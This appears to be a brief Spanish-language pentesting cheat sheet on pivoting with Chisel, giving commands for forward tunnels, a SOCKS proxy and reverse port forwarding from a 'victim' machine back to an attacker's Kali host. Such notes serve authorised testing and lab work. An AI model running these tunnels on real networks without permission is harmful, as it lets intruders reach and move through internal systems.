# Chisel for pivoting

- [Descargar Chisel](https://github.com/jpillora/chisel/releases)

### Chisel en maquina victima:
- `./chisel server --socks5 --port 51234`

### Chisel en maquina atacante kali
- `./chisel client victim-box-ip:51234 127.0.0.1:8001:127.0.0.1:8001 127.0.0.1:8443:127.0.01:8443`
    - Con esto vemos esos puertos en nuestro local
- Si no también así: `./chisel client attack-box-ip:51234 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443`

## Chisel con socks

### Maquina victima
- `./chisel server --socks5 --port 51234`

### Maquina atacante kali
- `./chisel client target-box-ip:51234 50080:socks`

# Reverse port forwarding
- Ejecutar chisel server en maquina atacante en modo reverso

### Chisel en maquina atacante kali
- `./chisel server --reverse --port 51234`

### Chisel en maquina victima
- `./chisel client attack-box-ip:51234 R:50080:socks`

#### Se puede combinar con ligolo + revert port por si no hay acceso SSH